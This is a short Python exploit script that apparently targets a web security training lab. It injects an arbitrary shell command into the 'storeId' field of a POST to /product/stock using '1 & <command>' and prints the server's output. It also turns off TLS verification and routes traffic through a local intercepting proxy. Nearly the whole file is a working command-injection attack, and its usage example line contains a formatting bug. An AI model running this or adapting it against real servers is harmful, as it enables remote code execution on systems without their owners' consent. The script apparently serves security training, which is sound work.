import requests           # to make http(s) requests
import sys                # take cmds from cmd_line
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def run_command(url, command):
  stock_path = '/product/stock'
  command_injection = '1 & ' + command
  params = {
    'productId' : '1',
    'storeId' : command_injection
  }
  make_request = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
  if (len(make_request.text) > 3):
    print("(+) Command Injection Successful!")
    print(f"(+) Output: {make_request.text}")
  else:
    print("(-) Command Injection Failed!")
    sys.exit(-1)

def main():
  if len(sys.argv) != 3:
    print("(+) Usage Instructions: %s <url> <command> " % sys.argv[0])
    print("(+) Example: www.example.com whoami" % sys.argv[0])
    sys.exit(-1)

  url = sys.argv[1]
  cmd = sys.argv[2]
  print("(+) Exploiting Command Injection.....")
  run_command(url, cmd)

if __name__ == "__main__":
  main()